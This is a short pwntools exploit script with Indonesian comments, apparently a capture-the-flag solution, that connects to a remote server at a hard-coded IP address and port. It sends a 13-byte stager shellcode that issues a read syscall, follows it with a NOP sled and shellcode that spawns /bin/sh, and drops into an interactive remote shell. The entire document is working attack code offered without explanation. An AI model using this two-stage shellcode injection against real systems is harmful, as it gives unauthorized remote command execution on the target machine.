from pwn import *

context.update(arch='amd64', os='linux')

# Hubungkan langsung ke server remote target CTF
io = remote('13.238.150.105', 35679)

# STAGER VERIFIED (13 Bytes)
stager = b'\xf3\x0f\x1e\xfa\x31\xc0\x31\xff\x6a\x7f\x5a\x0f\x05'

log.info("Mengirim stager IBT + RDX Clean...")
io.sendafter(b"bytes!\n", stager)

# Beri jeda agar network siap
time.sleep(0.5)

# PAYLOAD KEDUA:
# Beri 13 byte NOP karena RIP mendarat tepat di offset 13 pasca-syscall
real_shellcode = asm(shellcraft.sh())
payload = b"\x90" * 13 + real_shellcode

log.info("Mengirim shellcode utama ke target...")
io.send(payload)

# Pintu shell terbuka!
io.interactive()
